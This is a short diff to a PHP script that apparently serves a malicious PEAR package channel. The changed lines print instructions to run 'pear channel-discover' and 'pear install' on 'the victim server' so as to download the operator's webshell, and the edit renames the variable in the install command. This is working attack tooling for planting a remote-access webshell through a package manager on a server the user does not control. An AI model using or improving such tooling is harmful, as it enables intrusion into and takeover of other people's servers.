@@ -279,5 +279,5 @@ print("Now you should move all the files in `public_html' to the document root (
 print("After that, try to execute the following pear commands on the victim server and download your webshell." . PHP_EOL);
 print(PHP_EOL);
 print("\033[1mpear channel-discover $hostname\033[0m" . PHP_EOL);
-print("\033[1mpear install $hostname/$package_name\033[0m" . PHP_EOL);
+print("\033[1mpear install $channel_alias/$package_name\033[0m" . PHP_EOL);
 ?>
